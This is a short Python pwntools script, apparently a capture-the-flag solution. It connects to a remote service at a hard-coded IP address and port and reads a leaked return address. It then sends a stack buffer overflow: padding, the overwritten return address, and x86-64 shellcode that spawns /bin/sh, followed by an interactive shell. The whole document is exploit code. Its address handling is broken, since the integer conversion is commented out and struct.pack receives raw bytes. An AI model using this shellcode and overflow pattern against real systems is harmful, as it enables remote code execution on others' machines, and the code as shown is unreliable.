import struct
import pwn

shellcode = b"\x48\x31\xd2" + \
    b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" + \
    b"\x48\xc1\xeb\x08" + \
    b"\x53" + \
    b"\x48\x89\xe7" + \
    b"\x50" + \
    b"\x57" + \
    b"\x48\x89\xe6" + \
    b"\xb0\x3b" + \
    b"\x0f\x05"

p = pwn.remote("107.21.135.41", 3333)
p.recvuntil(b"Please select from menu: ")
p.sendline(b"1")
p.recvuntil(b"Current Return Address: ")
# rip_savd = int(p.recvline().decode(), 16)
rip_svd = p.recvline()
print("rip_saved", rip_svd)
address = struct.pack("<Q", rip_svd)
s = b'a' * 40 + address + shellcode
p.send(s)
p.interactive()